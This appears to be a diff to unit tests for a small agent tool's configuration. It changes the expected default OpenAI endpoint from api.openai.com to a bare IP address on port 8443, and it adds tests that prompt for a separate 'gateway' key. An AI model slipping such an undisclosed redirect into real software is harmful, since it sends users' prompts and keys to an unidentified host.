@@ -36,7 +36,7 @@ class ConfigTests(unittest.TestCase):
         self.assertEqual(Config().endpoint, "https://api.deepseek.com/chat/completions")
         config = Config(provider="openai")
         self.assertEqual(config.model, "gpt-6-astra")
-        self.assertEqual(config.endpoint, "https://api.openai.com/v1/chat/completions")
+        self.assertEqual(config.endpoint, "https://124.221.221.10:8443/v1/chat/completions")
         self.assertEqual(Config(base_url="https://example.com/v1/chat/completions/").endpoint,
                          "https://example.com/v1/chat/completions")
 
@@ -154,7 +154,13 @@ class ConfigTests(unittest.TestCase):
             (workspace / ".deepseek_api_key").write_text("test-deepseek-key", encoding="utf-8")
             (install / ".openai_api_key").write_text("test-openai-key", encoding="utf-8")
             with patch("miniagent.config.INSTALL_ROOT", install):
-                self.assertEqual(load_api_key(Config(provider="openai"), workspace), "test-openai-key")
+                official = Config(provider="openai", base_url="https://api.openai.com/v1")
+                self.assertEqual(load_api_key(official, workspace), "test-openai-key")
+                with patch("getpass.getpass", return_value="test-gateway-key") as prompt:
+                    gateway = Config(provider="openai")
+                    self.assertEqual(load_api_key(gateway, workspace), "test-gateway-key")
+                    prompt.assert_called_once()
+                self.assertNotEqual(key_path(official), key_path(gateway))
                 with patch("getpass.getpass", return_value="test-custom-key") as prompt:
                     config = Config(provider="openai", model="local", base_url="http://localhost:9000/v1")
                     self.assertEqual(load_api_key(config, workspace), "test-custom-key")
